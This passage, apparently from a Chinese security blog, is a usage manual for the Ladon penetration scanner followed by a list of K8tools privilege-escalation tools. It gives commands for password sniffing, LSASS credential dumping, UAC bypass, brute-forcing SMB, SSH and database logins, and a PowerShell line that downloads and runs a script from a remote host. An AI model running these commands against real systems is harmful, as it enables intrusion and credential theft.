</tr>
</tbody></table>
<h4 id="0x006-下载功能-2"><a href="#0x006-下载功能-2" class="headerlink" title="0x006 下载功能(2)"></a>0x006 下载功能(2)</h4><p>下载功能主要用于内网文件传输或者将VPS文件下载至目标机器</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>HttpDownLoad</td>
<td>HTTP下载</td>
<td>Ladon HttpDownLoad <a href="http://k8gege.org/test.exe">http://k8gege.org/test.exe</a></td>
</tr>
<tr>
<td>2</td>
<td>FtpDownLoad</td>
<td>Ftp下载</td>
<td>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</td>
</tr>
</tbody></table>
<h4 id="0x007-网络嗅探-3"><a href="#0x007-网络嗅探-3" class="headerlink" title="0x007 网络嗅探(3)"></a>0x007 网络嗅探(3)</h4><p>基于Socket RAW嗅探，无需安装Winpcap，但需管理员权限<br>主要用于发现内网存活机器或嗅探管理员登陆FTP或WEB站点密码<br>后续可能会添加其它功能可能另外写个专门用于嗅探的工具<br>PS: 目前网上大部嗅探工具都是基于Winpcap抓包，某些机器针对其做限制，会提示找不到网卡无法嗅探。<br>重点是不少程序不是GUI就是只能在Linux下用，如果你用py的SCAPY(需winpcap)来实现发现程序高达48M<br>当然也可用于发现恶意木马上线地址(如Cobal strike默认一分钟才发包的netstat不一定看得到)</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>FtpSniffer/SnifferFtp</td>
<td>Ftp密码嗅探</td>
<td>Ladon FtpSniffer 192.168.1.5</td>
</tr>
<tr>
<td>2</td>
<td>HttpSniffer/SnifferHTTP</td>
<td>HTTP密码嗅探</td>
<td>Ladon HTTPSniffer 192.168.1.5</td>
</tr>
<tr>
<td>3</td>
<td>Sniffer</td>
<td>网络嗅探(源地址、目标地址)</td>
<td>Ladon Sniffer</td>
</tr>
</tbody></table>
<h4 id="0x008-密码读取-2"><a href="#0x008-密码读取-2" class="headerlink" title="0x008 密码读取(2)"></a>0x008 密码读取(2)</h4><table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>EnumIIS/IisWeb</td>
<td>IIS站点密码读取</td>
<td>Ladon EnumIIS 或 Ladon IisWeb</td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/p/55476.html">DumpLsass </a></td>
<td>DumpLsass内存密码</td>
<td>Ladon DumpLsass</td>
</tr>
</tbody></table>
<h4 id="0x009-信息收集-3"><a href="#0x009-信息收集-3" class="headerlink" title="0x009 信息收集(3)"></a>0x009 信息收集(3)</h4><table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>EnumProcess/ProcessList/tasklist</td>
<td>进程详细信息</td>
<td>Ladon EnumProcess 或 Ladon Tasklist</td>
</tr>
<tr>
<td>2</td>
<td>GetCmdLine/CmdLine</td>
<td>获取命令行参数</td>
<td>Ladon cmdline 或 Ladon cmdline cmd.exe</td>
</tr>
<tr>
<td>3</td>
<td>GetInfo/GetInfo2</td>
<td>获取渗透基础信息</td>
<td>Ladon GetInfo 或 Ladon GetInfo2</td>
</tr>
</tbody></table>
<h4 id="0x010-远程执行-6"><a href="#0x010-远程执行-6" class="headerlink" title="0x010 远程执行(6)"></a>0x010 远程执行(6)</h4><table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">WmiExec</a></td>
<td>135端口执行命令</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">PsExec</a></td>
<td>445端口执行命令</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
</tr>
<tr>
<td>3</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">AtExec</a></td>
<td>445端口执行命令</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
</tr>
<tr>
<td>4</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">SshExec</a></td>
<td>22端口执行命令</td>
<td><a href="http://k8gege.org/Ladon/WinShell.html">http://k8gege.org/Ladon/WinShell.html</a></td>
</tr>
<tr>
<td>5</td>
<td><a href="http://k8gege.org/p/ladon_cs_shell.html">JspShell</a></td>
<td>Jsp一句话执行命令</td>
<td><a href="http://k8gege.org/p/ladon_cs_shell.html">http://k8gege.org/p/ladon_cs_shell.html</a></td>
</tr>
<tr>
<td>6</td>
<td><a href="http://k8gege.org/Ladon/webshell.html">WebShell</a></td>
<td>WebShell执行命令</td>
<td><a href="http://k8gege.org/Ladon/webshell.html">http://k8gege.org/Ladon/webshell.html</a></td>
</tr>
</tbody></table>
<h4 id="0x011-提权降权-3"><a href="#0x011-提权降权-3" class="headerlink" title="0x011 提权降权(3)"></a>0x011 提权降权(3)</h4><table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="http://k8gege.org/p/39070.html">BypassUac</a></td>
<td>绕过UAC执行,支持Win7-Win10</td>
<td>Ladon BypassUac c:\1.exe 或 Ladon BypassUac c:\1.bat</td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/p/55476.html">GetSystem</a></td>
<td>提权或降权运行程序</td>
<td>Ladon GetSystem cmd.exe 或 Ladon GetSystem cmd.exe explorer</td>
</tr>
<tr>
<td>3</td>
<td>Runas</td>
<td>模拟用户执行命令</td>
<td>Ladon Runas user pass cmd</td>
</tr>
</tbody></table>
<h4 id="0x012-其它功能-6"><a href="#0x012-其它功能-6" class="headerlink" title="0x012 其它功能(6)"></a>0x012 其它功能(6)</h4><table>
<thead>
<tr>
<th>ID</th>
<th>模块名称</th>
<th>功能说明</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><a href="http://k8gege.org/p/39070.html">EnableDotNet</a></td>
<td>一键启用.net 3.5(2008系统默认未启用)</td>
<td>Ladon EnableDotNet</td>
</tr>
<tr>
<td>2</td>
<td><a href="http://k8gege.org/p/39070.html">gethtml</a></td>
<td>获取内网站点HTML源码</td>
<td>Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></td>
</tr>
<tr>
<td>3</td>
<td><a href="http://k8gege.org/p/55476.html">CheckDoor</a></td>
<td>检测后门(网上公开多年的)</td>
<td>Ladon CheckDoor 或 Ladon AutoRun</td>
</tr>
<tr>
<td>4</td>
<td><a href="http://k8gege.org/">GetIP</a></td>
<td>获取本机内网IP与外网IP</td>
<td>Ladon GetIP</td>
</tr>
<tr>
<td>5</td>
<td><a href="http://k8gege.org/">WebSer</a></td>
<td>迷你WEB服务器</td>
<td>Ladon WebSer 80 或 Ladon web 80</td>
</tr>
<tr>
<td>6</td>
<td><a href="http://k8gege.org/">NetVer</a></td>
<td>查看安装.NET版本</td>
<td>Ladon NetVer 或 Ladon NetVersion</td>
</tr>
<tr>
<td>6</td>
<td><a href="http://k8gege.org/">PsVer</a></td>
<td>查看PowerShell版本</td>
<td>Ladon PsVer 或 Ladon PSVersion</td>
</tr>
</tbody></table>
<p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br> 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br> 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。</p>
<h3 id="外部插件模块-17"><a href="#外部插件模块-17" class="headerlink" title="外部插件模块(17)"></a>外部插件模块(17)</h3><table>
<thead>
<tr>
<th>ID</th>
<th>功能</th>
<th>实现语言</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>漏洞扫描</td>
<td>C语言</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2019-0708-Windows-Rdp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C" target="_blank" rel="noopener">CVE 2019-0708 Windows Rdp 3389漏洞批量检测</a></td>
</tr>
<tr>
<td>2</td>
<td>漏洞利用</td>
<td>Exp生成器</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-ThinkPHP-5.0.22-5.1.29-RCE-GetShell-Exploit" target="_blank" rel="noopener">ThinkPHP 5.0.22 5.1.29 RCE GetShell Exploit</a></td>
</tr>
<tr>
<td>3</td>
<td>漏洞利用</td>
<td>Python</td>
<td><a href="https://github.com/k8gege/ZimbraExploit" target="_blank" rel="noopener">CVE-2019-9621 Zimbra GetShell Exploit</a></td>
</tr>
<tr>
<td>4</td>
<td>漏洞利用</td>
<td>Python</td>
<td><a href="https://github.com/k8gege/CVE-2019-0604" target="_blank" rel="noopener">CVE-2019-0604 SharePoint GetShell Exploit</a></td>
</tr>
<tr>
<td>5</td>
<td>漏洞利用</td>
<td>Exp生成器</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-CVE-2016-3088-ActiveMQ-GetShell-Exploit" target="_blank" rel="noopener">CVE 2016-3088 ActiveMQ GetShell Exploit</a></td>
</tr>
<tr>
<td>6</td>
<td>漏洞利用</td>
<td>Python</td>
<td><a href="https://github.com/k8gege/SolrExp" target="_blank" rel="noopener">Apache Solr 8.2.0 Velocity RCE 0day Exploit</a></td>
</tr>
<tr>
<td>7</td>
<td>漏洞利用</td>
<td>Exp生成器</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-PhpStudy%E5%90%8E%E9%97%A8" target="_blank" rel="noopener">PhpStudy后门 GetShell Exploit</a></td>
</tr>
<tr>
<td>8</td>
<td>命令执行</td>
<td>INI配置</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FSSH%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Linux上控</a></td>
</tr>
<tr>
<td>9</td>
<td>命令执行</td>
<td>INI配置</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki/%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4-%E6%89%B9%E9%87%8FWin%E4%B8%8A%E6%8E%A7" target="_blank" rel="noopener">INI调用外部程序命令批量Windowns上控</a></td>
</tr>
<tr>
<td>10</td>
<td>漏洞扫描</td>
<td>Python</td>
<td><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">PHP-FPM 远程代码执行漏洞(CVE-2019-11043)</a></td>
</tr>
<tr>
<td>11</td>
<td>漏洞扫描</td>
<td>Exp生成器</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">Weblogic CVE-2018-2894漏洞检测</a></td>
</tr>
<tr>
<td>12</td>
<td>漏洞利用</td>
<td>PowerShell</td>
<td><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">MS17010EXP 永恒之蓝漏洞利用</a></td>
</tr>
<tr>
<td>13</td>
<td>脚本调用</td>
<td>PowerShell</td>
<td><a href="http://k8gege.org/p/32e1a912.html">Kali 2019无PowerShell执行脚本</a></td>
</tr>
<tr>
<td>14</td>
<td>口令扫描</td>
<td>INI配置</td>
<td><a href="http://k8gege.org/p/55476.html">ipcscan.ini INI插件之Ipc密码爆破</a></td>
</tr>
<tr>
<td>15</td>
<td>口令扫描</td>
<td>INI配置</td>
<td><a href="http://k8gege.org/p/55476.html">smbscan.ini INI插件之Smb密码爆破</a></td>
</tr>
<tr>
<td>16</td>
<td>口令扫描</td>
<td>INI配置</td>
<td><a href="http://k8gege.org/p/55476.html">smbhash.ini INI插件之NtlmHash爆破</a></td>
</tr>
<tr>
<td>17</td>
<td>口令扫描</td>
<td>INI配置</td>
<td><a href="http://k8gege.org/Ladon/WinrmScan.html">winrmscan.ini INI插件之Winrm密码爆破</a></td>
</tr>
</tbody></table>
<p>文档参考Cscan: <a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></p>
<h3 id="中级用法"><a href="#中级用法" class="headerlink" title="中级用法"></a>中级用法</h3><h3 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h3><p>0x001 参数 ip/24 ip/16 ip/8<br>命令: Ladon 192.168.1.8/24 OnlinePC</p>
<p>0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC</p>
<h3 id="禁ping扫描"><a href="#禁ping扫描" class="headerlink" title="禁ping扫描"></a>禁ping扫描</h3><p>默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>或者目标机器禁ping时,使用noping参数进行扫描,速度稍慢一点<br>Ladon noping<br>Ladon noping 192.168.1.8/24<br>Ladon noping 192.168.1.8/24 MS17010</p>
<h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
<h4 id="linux-macos下KaliLadon"><a href="#linux-macos下KaliLadon" class="headerlink" title="linux/macos下KaliLadon"></a>linux/macos下KaliLadon</h4><p>proxychains mono Ladon noping 192.168.1.8/24 MS17010<br>proxychains mono Ladon noping <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a> WhatCMS</p>
<h4 id="windows下Ladon-exe"><a href="#windows下Ladon-exe" class="headerlink" title="windows下Ladon.exe"></a>windows下Ladon.exe</h4><p>推荐proxifier 3.42及以上版本，最好是最新版4.0.1<br>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010</p>
<h3 id="配置INI调用任意程序、密码爆破"><a href="#配置INI调用任意程序、密码爆破" class="headerlink" title="配置INI调用任意程序、密码爆破"></a>配置INI调用任意程序、密码爆破</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br>或者有新的POC，但来不及或无法写成DLL来调用时<br>很多第3方工具不支持批量或者说根本不支持批量网段<br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br>新的漏洞来时你能调好POC就不错了，批量更要时间</p>
<h4 id="调用系统ping命令进行存活主机探测"><a href="#调用系统ping命令进行存活主机探测" class="headerlink" title="调用系统ping命令进行存活主机探测"></a>调用系统ping命令进行存活主机探测</h4><p>ping.ini<br>[Ladon]<br>exe=cmd.exe<br>arg=/c ping $ip$</p>
<p>命令:  Ladon ping.ini<br>命令:  Ladon 192.168.1.8/24 ping.ini</p>
<h4 id="调用Python-poc批量检测漏洞"><a href="#调用Python-poc批量检测漏洞" class="headerlink" title="调用Python poc批量检测漏洞"></a>调用Python poc批量检测漏洞</h4><p>[Ladon]<br>exe=F:\Python279\python.exe<br>arg=CVE-2019-11043-POC.py $ip$</p>
<p>例子: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p>
<h4 id="自定义程序密码爆破"><a href="#自定义程序密码爆破" class="headerlink" title="自定义程序密码爆破"></a>自定义程序密码爆破</h4><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p>
<p>smbhash.ini<br>[Ladon]<br>exe=smbexec.exe<br>arg=-hashes $pass$ $user$@$ip$<br>isok=Launching semi-interactive shell<br>port=445<br>log=true</p>
<p>INI参数说明<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p>
<p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>详见：<a href="http://localhost:4000/p/53177.html" target="_blank" rel="noopener">http://localhost:4000/p/53177.html</a></p>
<h3 id="配置端口扫描参数"><a href="#配置端口扫描参数" class="headerlink" title="配置端口扫描参数"></a>配置端口扫描参数</h3><h4 id="port-txt自定义端口"><a href="#port-txt自定义端口" class="headerlink" title="port.txt自定义端口"></a>port.txt自定义端口</h4><p>使用PortScan模块时，默认扫描常见高危漏洞端口<br>遇到修改了默认端口的，Ladon就无法扫描了吗？<br>使用port.txt<br>格式1:80,21,1433,3306,445<br>格式2:80-88,21-23,5800-5900<br>格式3:<br>21<br>23<br>80<br>格式4:<br>80-88<br>21-23</p>
<h4 id="命令行自定义端口"><a href="#命令行自定义端口" class="headerlink" title="命令行自定义端口"></a>命令行自定义端口</h4><p>Ladon 192.168.1.8/24 PortScan 80-89<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521</p>
<h3 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h3><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
<p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
<h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p>
<h5 id="mssql密码验证"><a href="#mssql密码验证" class="headerlink" title="mssql密码验证"></a>mssql密码验证</h5><p>(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>check.txt<br>192.168.1.8 1433 master sa k8gege<br>192.168.1.8 sa k8gege<br>192.168.1.8 1433 sa k8gege<br>命令: Ladon MssqlScan</p>
<h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p>
<h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p>
<h5 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h5><h6 id="SSH密码爆破"><a href="#SSH密码爆破" class="headerlink" title="SSH密码爆破"></a>SSH密码爆破</h6><p>check.txt<br>192.168.1.8 22 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon SshScan</p>
<p>详细用法：<a href="http://k8gege.org/Ladon/sshscan.html">http://k8gege.org/Ladon/sshscan.html</a></p>
<h6 id="SMB-WMI密码爆破"><a href="#SMB-WMI密码爆破" class="headerlink" title="SMB/WMI密码爆破"></a>SMB/WMI密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p>
<h6 id="NTLM-HASH密码爆破"><a href="#NTLM-HASH密码爆破" class="headerlink" title="NTLM HASH密码爆破"></a>NTLM HASH密码爆破</h6><p>check.txt<br>192.168.1.8 admin k8gege<br>命令: Ladon WmiScan 或 Ladon SmbScan</p>
<h5 id="网站密码"><a href="#网站密码" class="headerlink" title="网站密码"></a>网站密码</h5><h6 id="weblogic密码爆破"><a href="#weblogic密码爆破" class="headerlink" title="weblogic密码爆破"></a>weblogic密码爆破</h6><p>check.txt(url 用户 密码)<br><a href="http://192.168.1.8:7001/console" target="_blank" rel="noopener">http://192.168.1.8:7001/console</a> weblogic k8gege<br>命令: Ladon WeblogicScan</p>
<h5 id="文件密码"><a href="#文件密码" class="headerlink" title="文件密码"></a>文件密码</h5><h6 id="RAR文件密码爆破"><a href="#RAR文件密码爆破" class="headerlink" title="RAR文件密码爆破"></a>RAR文件密码爆破</h6><p>因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>命令: Ladon test.rar RarScan</p>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。</p>
<h4 id="0x001-PowerShell本地加载"><a href="#0x001-PowerShell本地加载" class="headerlink" title="0x001 PowerShell本地加载"></a>0x001 PowerShell本地加载</h4><p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
<h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
<h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
<h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
<h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
<h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
<h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br>不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br>为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br>最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br>懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本</p>
<h4 id="0x001-Exp生成器"><a href="#0x001-Exp生成器" class="headerlink" title="0x001 Exp生成器"></a>0x001 Exp生成器</h4><p>EXP生成器教程: <a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a><br>实战例子: <a href="https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894</a></p>
<h4 id="0x002-自定义模块教程"><a href="#0x002-自定义模块教程" class="headerlink" title="0x002 自定义模块教程"></a>0x002 自定义模块教程</h4><p>自定义模块教程: <a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></p>
<h4 id="0x003-插件例子源码"><a href="#0x003-插件例子源码" class="headerlink" title="0x003 插件例子源码"></a>0x003 插件例子源码</h4><p><a href="https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar</a></p>
<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title>K8tools工具合集20200118</title>
    <url>/p/72f1fea6.html</url>
    <content><![CDATA[<p><a href="https://github.com/k8gege" target="_blank" rel="noopener"><img alt="Author" data-original="https://img.shields.io/badge/Author-k8gege-blueviolet"></a><a href="https://github.com/k8gege/K8tools/issues" target="_blank" rel="noopener"><img alt="GitHub issues" data-original="https://img.shields.io/github/issues/k8gege/K8tools"></a> <a href="https://github.com/k8gege/K8tools/stargazers" target="_blank" rel="noopener"><img alt="Github Stars" data-original="https://img.shields.io/github/stars/k8gege/K8tools"></a> <a href="https://github.com/k8gege/K8tools/network/members" target="_blank" rel="noopener"><img alt="GitHub forks" data-original="https://img.shields.io/github/forks/k8gege/K8tools"></a><a href="https://github.com/k8gege/K8tools/blob/master/LICENSE" target="_blank" rel="noopener"><img alt="GitHub license" data-original="https://img.shields.io/github/license/k8gege/K8tools"></a></p>
<br>
声明: 工具仅供安全研究或授权渗透，非法用途后果自负。<br>
下载: https://github.com/k8gege/K8tools<br>

<p>PS: 不定期更新,文件比较大，可按需下载。工具有BUG或建议可直接Github上留言<br><br>提权工具均可在远控Cmd或WebShell运行，大部份经过修改编译兼容性稳定性更好<br><br>注意：不保证永久有效,喜欢自行保存。<br></p>
<h3>综合工具</h3>
[+] 扫描工具 Ladon 5.7 大型内网渗透扫描神器内置40个功能,支持Cobalt Strike<br>
[+] 扫描工具 K8Cscan5.4 大型内网渗透扫描器内置30个功能,支持Cobalt Strike<br>
[+] 综合工具 K8飞刀Final.rar<br>
[+] K8data.mdb K8飞刀漏洞数据库20190402<br>
[+] K8expList.txt K8飞刀漏洞利用列表<br>
<h3>提权工具</h3>
[+] 提权工具 CVE-2019-0803.exe Win32k漏洞提权工具<br>
[+] 提权工具 iislpe.exe  IIS全版本提权(仅限IIS帐户、服务帐户)<br>
[+] 提权工具 pr.exe pr有参版 pr0无参版（巴西烤肉:国内10年所说的PR或IIS6提权）<br>
[+] 提权工具 k8uac_20181125[K8].rar 目前还支持全版本WIN7-Win10<br>
[+] 提权工具 bypassUAC_Win7_10[K8team].rar  13还是15年？Win10打补丁失效<br>
[+] 提权工具 bypassUACexe_0419[K8].rar  13年的吧 打补丁的WIN7好像不支持了<br>
[+] 提权工具 Lpk提权_K8.rar   DLLHijack<br>
[+] 提权工具 Usp10提权_K8.rar  DLLHijack<br>
[+] 提权工具 MS11-046.exe <br>
[+] 提权工具 MS11-080.exe <br>
[+] 提权工具 MS14-068 EXP域内提权神器.rar<br>
[+] 提权工具 MS15-010提权[K8team]_20150603.rar<br>
[+] 提权工具 MS15-051提权 CVE-2015-1701_20150525[K8].rar<br>
[+] 提权工具 MS15-077提权工具[K8].rar<br>
[+] 提权工具 MS16-016提权EXP[K8].rar<br>
[+] 提权工具 Windows Win32k.sys EPATHOBJ 0day Exploit 提权工具 [K8team].rar<br>
[+] 提权工具  k8downexec.mof<br>
[+] 提权工具  k8zzz.rar SMB溢出 支持执行自定义exe程序<br>
[+] 提权工具  udf.dll MYSQL udf提权DLL<br>
[+] 提权工具  ws2help提权_K8.rar<br>
[+] 提权工具  卡巴6.0.2.614提权.exe<br>
[+] 提权工具  小红伞 Avira avipbb.sys 提权Exploit_1024[K8].rar<br>
[+] 提权工具  提权Admin2SystemRun_0419[K8].rar<br>
[+] 提权工具  提权GetTrustedInstaller_0419[K8].rar<br>
[+] 提权工具  降权System2AdminRun_0419[K8].rar<br>
[+] 提权工具  无NET添加用户提权_20140511[K8].rar<br>
